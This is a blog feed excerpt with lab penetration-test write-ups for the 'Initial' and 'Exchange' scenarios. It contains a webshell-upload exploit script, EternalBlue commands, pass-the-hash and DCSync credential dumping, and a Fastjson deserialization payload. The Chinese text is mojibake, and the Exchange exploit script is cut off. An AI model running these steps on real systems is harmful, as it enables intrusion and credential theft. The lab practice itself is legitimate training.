    <content type="html"><![CDATA[<h1>æ˜¥ç§‹äº‘å¢ƒ Initial</h1><h2 id="flag01">flag01</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">39.99.141.147:80 open</span><br><span class="line">39.99.141.147:22 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.99.141.147      code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[+] PocScan http://39.99.141.147 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure><p>ç›´æ¥å°±æ‰«åˆ°tpçš„æ´äº†</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820155252858.png" alt="image-20240820155252858"></p><p>å‘ç°www-dataæƒé™</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820155528465.png" alt="image-20240820155528465"></p><p>åˆ©ç”¨mysqlææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mysql -e <span class="string">&#x27;\! whoami&#x27;</span></span><br><span class="line"></span><br><span class="line">sudo mysql -e <span class="string">&#x27;\! cat /root/f*/f*&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="flag02">flag02</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.22.1.15  netmask 255.255.0.0  broadcast 172.22.255.255</span><br><span class="line">        inet6 fe80::216:3eff:fe26:a581  prefixlen 64  scopeid 0x20&lt;<span class="built_in">link</span>&gt;</span><br><span class="line">        ether 00:16:3e:26:a5:81  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 134555  bytes 188525088 (188.5 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 56675  bytes 12946270 (12.9 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.<span class="regexp">/fs -h 172.22.1.1/</span><span class="number">24</span> -o result.txt</span><br></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">172.22.1.2:88 open</span><br><span class="line">172.22.1.21:139 open</span><br><span class="line">172.22.1.2:139 open</span><br><span class="line">172.22.1.21:135 open</span><br><span class="line">172.22.1.18:139 open</span><br><span class="line">172.22.1.18:80 open</span><br><span class="line">172.22.1.15:80 open</span><br><span class="line">172.22.1.2:135 open</span><br><span class="line">172.22.1.18:135 open</span><br><span class="line">172.22.1.15:22 open</span><br><span class="line">172.22.1.18:3306 open</span><br><span class="line">172.22.1.21:445 open</span><br><span class="line">172.22.1.2:445 open</span><br><span class="line">172.22.1.18:445 open</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.1.2</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.1.2</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.1.18</span><br><span class="line">   [-&gt;]XIAORANG-OA01</span><br><span class="line">   [-&gt;]172.22.1.18</span><br><span class="line">[*] WebTitle: http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.1.21</span><br><span class="line">   [-&gt;]XIAORANG-WIN7</span><br><span class="line">   [-&gt;]172.22.1.21</span><br><span class="line">[+] 172.22.1.21MS17-010(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class="line">[*] NetBios: 172.22.1.2      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] 172.22.1.2  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios: 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1 </span><br><span class="line">[*] NetBios: 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600 </span><br><span class="line">[*] WebTitle: http://172.22.1.18        code:302 len:0      title:None è·³è½¬url: http://172.22.1.18?m=login</span><br><span class="line">[*] WebTitle: http://172.22.1.18?m=login code:200 len:4012   title:ä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿ</span><br><span class="line">[+] http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1</span><br></pre></td></tr></table></figure><p>æ­å»ºä»£ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gost -L=:10000 &amp;</span><br></pre></td></tr></table></figure><p>å…ˆçœ‹çœ‹è¿™ä¸ªä¿¡å‘¼oaï¼Œæœ‰å¼±å£ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/admin123</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨åå°æ¼æ´ä¸Šä¼ shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.phpä¸ºwebshell</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éœ€è¦ä¿®æ”¹ä»¥ä¸‹å†…å®¹ï¼š</span></span><br><span class="line"><span class="comment"># url_pre = &#x27;http://&lt;IP&gt;/&#x27;</span></span><br><span class="line"><span class="comment"># &#x27;adminuser&#x27;: &#x27;&lt;ADMINUSER_BASE64&gt;&#x27;,</span></span><br><span class="line"><span class="comment"># &#x27;adminpass&#x27;: &#x27;&lt;ADMINPASS_BASE64&gt;&#x27;,</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line"><span class="comment"># url3 = url_pre + &#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&lt;ID&gt;&#x27;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: open(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line">filepath = str(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[0] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(filepath)</span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">url3 = url_pre + f<span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>è®°å¾—è‡ªå·±å†™ä¸ª1.phpçš„é©¬å­ï¼Œèšå‰‘è¿æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\flag&gt; <span class="built_in">type</span> flag02.txt</span><br></pre></td></tr></table></figure><h2 id="flag03">flag03</h2><p>172.22.1.21æ˜¯ä¸ªms17-010ï¼Œä¸Šmsfæ‰“å°±å®Œäº‹äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search ms17-010</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">show payloads</span><br><span class="line"><span class="built_in">set</span> payload payload/windows/x64/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhosts 172.22.1.21</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>ç„¶åç­‰ç€æ‹¿shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hashdump</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Administrator</span>:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">48</span>f6da83eb89a4da8a1cc963b855a799:::</span><br><span class="line"><span class="attribute">Guest</span>:<span class="number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure><p>æ¨ªå‘ä¸Šå»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :48f6da83eb89a4da8a1cc963b855a799 ./administrator@172.22.1.21 -codec gbk</span><br></pre></td></tr></table></figure><p>æ²¡æ‰¾åˆ°flagï¼ŒåŠ ä¸ªç”¨æˆ·ä¸Šå»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user Chu0 <span class="built_in">whoami</span>@666 /add</span><br><span class="line">net localgroup administrators Chu0 /add</span><br></pre></td></tr></table></figure><p>bloodhoundæ”¶é›†ä¿¡æ¯</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820162234549.png" alt="image-20240820162234549"></p><p>æ‰€ä»¥ç›´æ¥dumpåŸŸç®¡å“ˆå¸Œï¼Œæ¨ªå‘è¿‡å»æ‹¿åˆ°åŸŸæ§çš„flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[DC] <span class="string">&#x27;xiaorang.lab&#x27;</span> will be the domain</span><br><span class="line">[DC] <span class="string">&#x27;DC01.xiaorang.lab&#x27;</span> will be the DC server</span><br><span class="line">[DC] Exporting domain <span class="string">&#x27;xiaorang.lab&#x27;</span></span><br><span class="line">[rpc] Service  : ldap</span><br><span class="line">[rpc] AuthnSvc : GSS_NEGOTIATE (9)</span><br><span class="line">502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514</span><br><span class="line">1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512</span><br><span class="line">1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512</span><br><span class="line">1000    DC01$   075b7ba049ee9b65eb3aea0fb13440e3        532480</span><br><span class="line">500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512</span><br><span class="line">1104    XIAORANG-OA01$  eca40798d7ca35d5b2f0ecb7217a68a5        4096</span><br><span class="line">1108    XIAORANG-WIN7$  c7631dbcd38dac582e8c891880c40517        4096</span><br></pre></td></tr></table></figure><p>æ¨ªå‘åŸŸç®¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 impacket-smbexec -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang.lab/administrator@172.22.1.2 -codec gbk</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\<span class="built_in">users</span>\administrator\flag\flag03.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æ˜¥ç§‹äº‘å¢ƒ Exchange</title>
    <link href="https://bowuchuling.github.io/posts/chunqiu_Exchange.html"/>
    <id>https://bowuchuling.github.io/posts/chunqiu_Exchange.html</id>
    <published>2024-08-20T15:20:52.615Z</published>
    <updated>2024-08-20T15:35:08.678Z</updated>
    
    <content type="html"><![CDATA[<h1>æ˜¥ç§‹äº‘å¢ƒ Exchange</h1><h2 id="flag01">flag01</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">39.101.171.222:8000 open</span><br><span class="line">39.101.171.222:22 open</span><br><span class="line">39.101.171.222:80 open</span><br><span class="line">[*] alive ports len is: 3</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.101.171.222     code:200 len:19813  title:lumia</span><br><span class="line">[*] WebTitle http://39.101.171.222:8000 code:302 len:0      title:None è·³è½¬url: http://39.101.171.222:8000/login.html</span><br><span class="line">[*] WebTitle http://39.101.171.222:8000/login.html code:200 len:5662   title:Lumia ERP</span><br></pre></td></tr></table></figure><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2OTg5NjE5MQ==&amp;mid=2247484475&amp;idx=1&amp;sn=deee0c3bc0b9fe10b89af784947aa1a3&amp;chksm=ce975eabf9e0d7bd5c952c462883fa89eafaadfba829dd2058fccb135a5a6970e29fe6487e1a&amp;scene=126&amp;sessionid=1686528295&amp;key=42e64e73470f56ada54bd87e00fbb9ee86826bf40b566f978fb0f0e311c0eb4ab318884991ba35ad361aa1595ed3bd0846512b2fe73e212c0c074eb836d443f457f9ea24f06bf67d68ba10b149db19e7559896ef1ec2dc36c4bc54f89f87a24d4ce56cb88823f6d8b48e0fbde3801b688add37e0d0b8ab1ad98a5fda1cd75ec5&amp;ascene=15&amp;uin=MTI5ODM0MTMwNQ%3D%3D&amp;devicetype=Windows+10+x64&amp;version=63060012&amp;lang=zh_CN&amp;session_us=gh_d299f82219a7&amp;exportkey=n_ChQIAhIQlWqlotH1PqlfVL6dmgb%2BChLvAQIE97dBBAEAAAAAAK%2BgKYPmO94AAAAOpnltbLcz9gKNyK89dVj0th39V71PeGeBRMgmIKcZb%2F9QsVC%2FGXM0IJ6ajy%2Fk6NFsIJtiQRTPKhOq0bWO3qFepGVEcuUw4wcd6D%2BY4mEjP04Ei3hA4IbZNWhi6YZx1hwWoQLYR5UTrFzbCTmOIKCOtYbNdRtn7aZBO0A0IwzQcT0EicW2lhFd9eHg%2FXBMhrLZMn48xmaxjL1qVJIU%2B4Mqld%2FD6KImSIU8TnYXioT9cVKnvQsgIjyGSKDhcZwQ1TXu3vxW0DDGyi%2BWoHmV0s2k%2FMtIkni6IFTz&amp;acctmode=0&amp;pass">å‚è€ƒæ–‡ç« </a>åå¤ERPç»„åˆæ‹³</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user/getAllList;.ico</span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820201710222.png" alt="image-20240820201710222"></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820201650283.png" alt="image-20240820201650283"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.101.171.222:8000/user/list?search=%7B%20%22name%22%3A%20%7B%20%22%40type%22%3A%20%22java.lang.AutoCloseable%22%2C%20%22%40type%22%3A%20%22com.mysql.jdbc.JDBC4Connection%22%2C%20%22hostToConnectTo%22%3A%20%22ip%22%2C%20%22portToConnectTo%22%3A%203306%2C%20%22info%22%3A%20%7B%20%22user%22%3A%20%22chu0%22%2C%20%22password%22%3A%20%22pass%22%2C%20%22statementInterceptors%22%3A%20%22com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor%22%2C%20%22autoDeserialize%22%3A%20%22true%22%2C%20%22NUM_HOSTS%22%3A%20%221%22%20%7D%20%7D</span><br></pre></td></tr></table></figure><p>ä¼ªé€ ä¸€ä¸ªMySQLæœåŠ¡å™¨</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240820201949903.png" alt="image-20240820201949903"></p><p>searchå€¼çš„ipè®°å¾—æ”¹ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /root/f*/f*</span><br></pre></td></tr></table></figure><h2 id="flag02">flag02</h2><p>æ‰«å†…ç½‘ï¼Œæ­ä»£ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eth0      Link encap:Ethernet  HWaddr 00:16:3e:08:c9:d6  </span><br><span class="line">          inet addr:172.22.3.12  Bcast:172.22.255.255  Mask:255.255.0.0</span><br><span class="line">          inet6 addr: fe80::216:3eff:fe08:c9d6/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:119967 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:74394 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:152794359 (152.7 MB)  TX bytes:21724339 (21.7 MB)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">./fs -h 172.22.3.1/24 -o result.txt</span><br><span class="line"></span><br><span class="line">172.22.3.12:22 open</span><br><span class="line">172.22.3.9:808 open</span><br><span class="line">172.22.3.2:88 open</span><br><span class="line">172.22.3.9:8172 open</span><br><span class="line">172.22.3.12:8000 open</span><br><span class="line">172.22.3.26:445 open</span><br><span class="line">172.22.3.9:445 open</span><br><span class="line">172.22.3.2:445 open</span><br><span class="line">172.22.3.9:443 open</span><br><span class="line">172.22.3.26:139 open</span><br><span class="line">172.22.3.9:139 open</span><br><span class="line">172.22.3.2:139 open</span><br><span class="line">172.22.3.26:135 open</span><br><span class="line">172.22.3.9:135 open</span><br><span class="line">172.22.3.2:135 open</span><br><span class="line">172.22.3.9:81 open</span><br><span class="line">172.22.3.9:80 open</span><br><span class="line">172.22.3.12:80 open</span><br><span class="line">[*] NetBios: 172.22.3.26     XIAORANG\XIAORANG-PC           </span><br><span class="line">[*] 172.22.3.2  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] WebTitle: http://172.22.3.12        code:200 len:19813  title:lumia</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.3.9</span><br><span class="line">   [-&gt;]XIAORANG-EXC01</span><br><span class="line">   [-&gt;]172.22.3.9</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.3.2</span><br><span class="line">   [-&gt;]XIAORANG-WIN16</span><br><span class="line">   [-&gt;]172.22.3.2</span><br><span class="line">[*] WebTitle: http://172.22.3.12:8000   code:302 len:0      title:None è·³è½¬url: http://172.22.3.12:8000/login.html</span><br><span class="line">[*] NetInfo:</span><br><span class="line">[*]172.22.3.26</span><br><span class="line">   [-&gt;]XIAORANG-PC</span><br><span class="line">   [-&gt;]172.22.3.26</span><br><span class="line">[*] NetBios: 172.22.3.9      XIAORANG-EXC01.xiaorang.lab         Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: http://172.22.3.12:8000/login.html code:200 len:5662   title:Lumia ERP</span><br><span class="line">[*] NetBios: 172.22.3.2      [+]DC XIAORANG-WIN16.xiaorang.lab      Windows Server 2016 Datacenter 14393 </span><br><span class="line">[*] WebTitle: http://172.22.3.9:81      code:403 len:1157   title:403 - ç¦æ­¢è®¿é—®: è®¿é—®è¢«æ‹’ç»ã€‚</span><br><span class="line">[*] WebTitle: https://172.22.3.9:8172   code:404 len:0      title:None</span><br><span class="line">[*] WebTitle: http://172.22.3.9         code:403 len:0      title:None</span><br><span class="line">[*] WebTitle: https://172.22.3.9        code:302 len:0      title:None è·³è½¬url: https://172.22.3.9/owa/</span><br><span class="line">[*] WebTitle: https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f&amp;reason=0 code:200 len:28237  title:Outlook</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰ä¸€ä¸ªexchangeæœåŠ¡å™¨ï¼Œå¯ä»¥ä½¿ç”¨å†å²æ¼æ´æ”»å‡»ï¼Œè„šæœ¬å¦‚ä¸‹ï¼Œå¯ä»¥ç›´æ¥è·å–shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 2.py -u c -user administrator -suffix @xiaorang.lab 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span 